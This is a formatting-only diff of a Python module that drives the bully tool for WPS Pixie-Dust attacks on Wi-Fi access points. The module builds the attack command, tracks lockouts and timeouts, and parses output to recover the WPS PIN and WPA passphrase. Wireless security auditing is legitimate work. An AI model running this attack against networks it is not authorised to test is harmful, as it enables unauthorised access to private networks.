@@ -13,6 +13,7 @@ from ..config import Configuration
 import os, time, re
 from threading import Thread
 
+
 class Bully(Attack, Dependency):
     dependency_required = False
     dependency_name = 'bully'
@@ -35,14 +36,14 @@ class Bully(Attack, Dependency):
 
         if Process.exists('stdbuf'):
             self.cmd.extend([
-                "stdbuf", "-o0" # No buffer. See https://stackoverflow.com/a/40453613/7510292
+                "stdbuf", "-o0"  # No buffer. See https://stackoverflow.com/a/40453613/7510292
             ])
 
         self.cmd.extend([
             "bully",
             "--bssid", target.bssid,
             "--channel", target.channel,
-            "--detectlock", # Detect WPS lockouts unreported by AP
+            "--detectlock",  # Detect WPS lockouts unreported by AP
             "--force",
             "-v", "4",
             "--pixiewps",
@@ -50,7 +51,6 @@ class Bully(Attack, Dependency):
         ])
 
         self.bully_proc = None
-
 
     def run(self):
         with Airodump(channel=self.target.channel,
@@ -63,9 +63,9 @@ class Bully(Attack, Dependency):
 
             # Start bully
             self.bully_proc = Process(self.cmd,
-                stderr=Process.devnull(),
-                bufsize=0,
-                cwd=Configuration.temp())
+                                      stderr=Process.devnull(),
+                                      bufsize=0,
+                                      cwd=Configuration.temp())
 
             # Start bully status thread
             t = Thread(target=self.parse_line_thread)
@@ -86,19 +86,22 @@ class Bully(Attack, Dependency):
 
                     # Check if entire attack timed out.
                     if self.running_time() > Configuration.wps_pixie_timeout:
-                        self.pattack('{R}Failed: {O}Timeout after %d seconds{W}' % Configuration.wps_pixie_timeout, newline=True)
+                        self.pattack('{R}Failed: {O}Timeout after %d seconds{W}' % Configuration.wps_pixie_timeout,
+                                     newline=True)
                         self.stop()
                         return
 
                     # Check if timeout threshold was breached
                     if self.total_timeouts >= Configuration.wps_timeout_threshold:
-                        self.pattack('{R}Failed: {O}More than %d timeouts{W}' % Configuration.wps_timeout_threshold, newline=True)
+                        self.pattack('{R}Failed: {O}More than %d timeouts{W}' % Configuration.wps_timeout_threshold,
+                                     newline=True)
                         self.stop()
                         return
 
                     # Check if WPSFail threshold was breached
                     if self.total_failures >= Configuration.wps_fail_threshold:
-                        self.pattack('{R}Failed: {O}More than %d WPSFails{W}' % Configuration.wps_fail_threshold, newline=True)
+                        self.pattack('{R}Failed: {O}More than %d WPSFails{W}' % Configuration.wps_fail_threshold,
+                                     newline=True)
                         self.stop()
                         return
 
@@ -113,23 +116,20 @@ class Bully(Attack, Dependency):
         if self.crack_result is None:
             self.pattack("{R}Failed{W}", newline=True)
 
-
     def pattack(self, message, newline=False):
         # Print message with attack information.
         time_left = Configuration.wps_pixie_timeout - self.running_time()
 
         Color.clear_entire_line()
         Color.pattack("WPS",
-                self.target,
-                'Pixie-Dust',
-                '{W}[{C}%s{W}] %s' % (Timer.secs_to_str(time_left), message))
+                      self.target,
+                      'Pixie-Dust',
+                      '{W}[{C}%s{W}] %s' % (Timer.secs_to_str(time_left), message))
         if newline:
             Color.pl("")
 
-
     def running_time(self):
         return int(time.time() - self.start_time)
-
 
     def get_status(self):
         main_status = self.state
@@ -149,7 +149,6 @@ class Bully(Attack, Dependency):
 
         return main_status
 
-
     def parse_line_thread(self):
         for line in iter(self.bully_proc.pid.stdout.readline, b""):
             if line == "": continue
@@ -157,14 +156,13 @@ class Bully(Attack, Dependency):
 
             if Configuration.verbose > 1:
                 Color.pe('\n{P} [bully:stdout] %s' % line)
-                
+
             self.state = self.parse_state(line)
 
             self.crack_result = self.parse_crack_result(line)
 
             if self.crack_result:
                 break
-
 
     def parse_crack_result(self, line):
         # Check for line containing PIN and PSK
@@ -203,15 +201,14 @@ class Bully(Attack, Dependency):
         if not self.crack_result and self.cracked_pin and self.cracked_key:
             self.pattack("{G}Cracked PSK: {C}%s{W}" % self.cracked_key, newline=True)
             self.crack_result = CrackResultWPS(
-                    self.target.bssid,
-                    self.target.essid,
-                    self.cracked_pin,
-                    self.cracked_key)
+                self.target.bssid,
+                self.target.essid,
+                self.cracked_pin,
+                self.cracked_key)
             Color.pl("")
             self.crack_result.dump()
 
         return self.crack_result
-
 
     def parse_state(self, line):
         state = self.state
@@ -235,7 +232,7 @@ class Bully(Attack, Dependency):
             self.locked = False
             # group(1)=M3/M5, group(2)=result, group(3)=PIN
             m_state = mx_result_pin.group(1)
-            result = mx_result_pin.group(2) # NoAssoc, WPSFail, Pin1Bad, Pin2Bad
+            result = mx_result_pin.group(2)  # NoAssoc, WPSFail, Pin1Bad, Pin2Bad
             pin = mx_result_pin.group(3)
 
             if result == "Timeout":
@@ -271,15 +268,12 @@ class Bully(Attack, Dependency):
 
         return state
 
-
     def stop(self):
         if hasattr(self, "pid") and self.pid and self.pid.poll() is None:
             self.pid.interrupt()
 
-
     def __del__(self):
         self.stop()
-
 
     @staticmethod
     def get_psk_from_pin(target, pin):
@@ -316,7 +310,9 @@ if __name__ == '__main__':
     Configuration.initialize()
     Configuration.interface = 'wlan0mon'
     from ..model.target import Target
-    fields = '34:21:09:01:92:7C,2015-05-27 19:28:44,2015-05-27 19:28:46,1,54,WPA2,CCMP TKIP,PSK,-58,2,0,0.0.0.0,9,AirLink89300,'.split(',')
+
+    fields = '34:21:09:01:92:7C,2015-05-27 19:28:44,2015-05-27 19:28:46,1,54,WPA2,CCMP TKIP,PSK,-58,2,0,0.0.0.0,9,AirLink89300,'.split(
+        ',')
     target = Target(fields)
     psk = Bully.get_psk_from_pin(target, '01030365')
     print("psk", psk)
